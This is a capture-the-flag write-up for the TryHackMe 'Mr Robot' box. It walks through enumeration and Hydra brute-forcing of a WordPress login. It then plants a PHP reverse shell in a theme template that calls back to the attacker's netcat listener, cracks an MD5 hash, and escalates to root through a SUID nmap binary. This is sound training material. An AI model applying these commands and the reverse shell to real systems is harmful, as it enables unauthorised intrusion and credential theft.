## Challenge Infomation
Challenge Name: Mr Robot CTF 

Room URL: https://tryhackme.com/r/room/mrrobot 

Difficulty Level: Medium 

Category: Web Exploitation, Network Security 

Author: Ben & TryHackMe 

Date Completed: August 5, 2024 

Description: Based on the Mr. Robot show, can you root this box? 

## Introduction



## Prerequisites
* Nmap
* GoBuster
* Hydra

## Steps To Solve The Challenge
### 1. Reconnaissance
### 1.1: Intial Scan
I used Nmap to scan the websites to find ports that are open

command: `nmap 10.10.159.27`

**Findings:**

Found that services like `ssh` `http` `https` at port `22` `80` `443` respectively
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 19:17 IST
Nmap scan report for 10.10.159.27
Host is up (0.16s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
```

### Step 1.2: Detailed Service Enumeration

I tried `/robot.txt` path and found 2 entries

**Findings:** 

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Found the key 1 of 3 after navigating inside `http://10.10.159.27/key-1-of-3.txt` path

***Key: `0*****************************9`***

futher i took a look insdie `fsocity.dic` file and apperared to list of usernames

```
true
false
wikia
from
the
now
Wikia
extensions
scss
window
http
var
page
Robot
Elliot
styles
and
document
mrrobot
com
ago
function
-MORE-
```

**HTTP Service:** Used **gobuster** to find directories.

Command: `gobuster dir -u 10.10.159.27 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q -o gobuster-common.txt`

```
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.159.27/0/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.159.27/Image/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.159.27/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/atom/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.159.27/audio/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.159.27/blog/]
/css                  (Status: 301) [Size: 232] [--> http://10.10.159.27/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.159.27/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.159.27/image/]
/images               (Status: 301) [Size: 235] [--> http://10.10.159.27/images/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.159.27/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.159.27/js/]
/license              (Status: 200) [Size: 309]
/intro                (Status: 200) [Size: 516314]
/login                (Status: 302) [Size: 0] [--> http://10.10.159.27/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.159.27/]
/phpmyadmin           (Status: 403) [Size: 94]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/rdf/]
/readme               (Status: 200) [Size: 64]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.10.159.27/render/https:/www.google.com]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.159.27/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 234] [--> http://10.10.159.27/video/]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.159.27/wp-admin/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.159.27/wp-content/]
/wp-config            (Status: 200) [Size: 0]
/wp-cron              (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.159.27/wp-includes/]
/wp-load              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-login             (Status: 200) [Size: 2606]
/wp-settings          (Status: 500) [Size: 0]
/wp-mail              (Status: 500) [Size: 3064]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.159.27/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc               (Status: 405) [Size: 42]
```

**Findings:** Discovered `/wp-login` directory.

I found that it is a wordpress website and using the `fsocity.dic` dictionary i tried brute forcing the login csredentials

### Step 1.3: Capturing Login Request

I'm using **Burp Suite** to capture login request in the `/wp-login` page using a failed login. 

**findings:**
```
POST /wp-login.php HTTP/1.1

Host: 10.10.159.27

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 101

Origin: http://10.10.159.27

DNT: 1

Connection: keep-alive

Referer: http://10.10.159.27/wp-login

Cookie: s_cc=true; s_fid=4762DBD7DCB086A6-28E527B0D5C8FF4A; s_nr=1722867205385; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check

Upgrade-Insecure-Requests: 1



log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.159.27%2Fwp-admin%2F&testcookie=1
```

I need only the following line in the result for the acutal Brute Force.

`log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.159.27%2Fwp-admin%2F&testcookie=1`

this shows me how the username and passwords are transmitted to the server.

I also found some Error Box named `ERROR: Invalid username.` after entering admin for username and password.

These kind of Error is helpful in pentesting.

### 2. Exploitation

### Step 2.1: Brute Force

Now to brute force this login i'm using `hydra`

To start the brute force im using `fsocity.dic` for username and a static password `test` to find the username of the login page.

**command:** `hydra -L fsocity.dic -p test 10.10.159.27 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30`

**Findings:**
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-05 20:11:36
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
[DATA] attacking http-post-form://10.10.159.27:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.159.27   login: Elliot   password: test
```

Now from the result i know that `Elliot` is the username of the login page.

Now coming to the login page and entering username as `Elliot`, i see a ERROR box named `ERROR: The password you entered for the username Elliot is incorrect.` 

with this result i found that i can u hydra again to find the password

**command:** `hydra -l Elliot -P fsocity.dic 10.10.159.27 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30`

**Findings:**

I found that the password of the login is `ER28-0652` . u know if u watch the mr.robot series its acutally elliots employee id at AllSafe.

After logining in in wordpress im inside wordpress dashboard under the user Elliot Alderson

### 3. Post-Exploitation

### Step 3.1: PHP Reverse Shell

now that i got access to the admin, I'm gonna the editor option under Appearance section

So, for the php reverse shell to work without too much traffics i'm using the Archive template for better result.

To get a connection from the target machine i started a listener at port `53`

**command:** `rlwrap nc -lvnp 53`

I'm using `rlwrap` because it allows me to edit the upcoming connections.

while netcat is watiing for the connection to estabilish i'm sourcing PHP Reverse Shell Script from a github repository called pentestmonkey.
[PHP-Reverse-Shell-pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

I copied the code and pasted it inside the `archive.php` template in which i changed the `host ip address` and the `port` i want to listen from.

To establish a connection with `netcat` im firing up `archive.php` site `http://10.10.159.27/wp-content/themes/twentyfifteen/archive.php`

once i started the site, at my terminal my listener had estabished a connection to the server

```
┌──(kali㉿kali)-[~/AJOY]
└─$ rlwrap nc -lvnp 53 
listening on [any] 53 ...
connect to [10.17.105.111] from (UNKNOWN) [10.10.159.27] 38786
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 15:18:06 up  1:44,  0 users,  load average: 0.08, 0.08, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```

After getting access to the target machine i browers thourgh the folders and found two entires `key-2-of-3.txt` and `password.raw-md5` 

i found the next `key` inside `/robot/key-2-of-3.txt`, but when tried to open `key-2-of-3.txt` using `cat` command i was denied from it.

To check why this happend, i used `ls -lsa` to check in which user the file is accessiable, and found it was under a user named robot
```
$ ls -lsa
total 16
4 drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
4 drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
4 -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
4 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

but i found `robot:c3fcd3d76192e4007dfb496cca67e13b` inside `password.raw-md5` which was some kind of password for `robot` user in `RAW-MD5` hash.
```
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Now to crack this hash i used a password cracking package call `john` or also know as `john the ripper` to crack the `RAW-MD5` hash.

### Step 3.1: Decrypting Hash

**Command:** `john md5.hash --wordlist=fsocity.dic --format=RAW-MD5`

**Findings:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2024-08-05 20:59) 0g/s 4516Kp/s 4516Kc/s 4516KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
Session completed. 
```

So i found that the password inside the `RAW-MD5` hash was `abcdefghijklmnopqrstuvwxyz`

### 4. Shell Upgrade

### Step 4.1:

Now i'm getting back to the terminal to switch to the robot user.

So to use su command the shell should be fully interactive, i'm using a python script to upgrade the dumby shell to interactive shell.

**command:** `python3 -c 'import pty; pty.spawn("/bin/bash")'`

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$
```

### Step 4.2:

Now i'm change from `daemon` to `robot` user with the password we found in the hash.

```
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ whoami
whoami
robot

```
I found the next key `key-2-of-3` inside `/home/robot/key-2-of-3.txt`

***Key: `8*****************************9`***

### 5. Root Privilage Escalation

### Step 5.1:

To find the root user i'm searching for binary bin in order to spawn a shell

**command:** `find / -perm +6000 2>/dev/null | grep '/bin/'`

```
robot@linux:~$ find / -perm +6000 2>/dev/null | grep '/bin/'
find / -perm +6000 2>/dev/null | grep '/bin/'
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap

```

### Step 5.2:

Now i can see a binary bin for `Nmap` which i can use to spawn a interactive shell.

To excute it im using `nmap` interactive method

**command:** `/usr/local/bin/nmap --interactive`

```
/usr/local/bin/nmap --interactive 

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
```

I found the final key `key-3-of-3` under `/root/key-3-of-3.txt`

***Key: `0*****************************4`***`

---ALL THE BEST---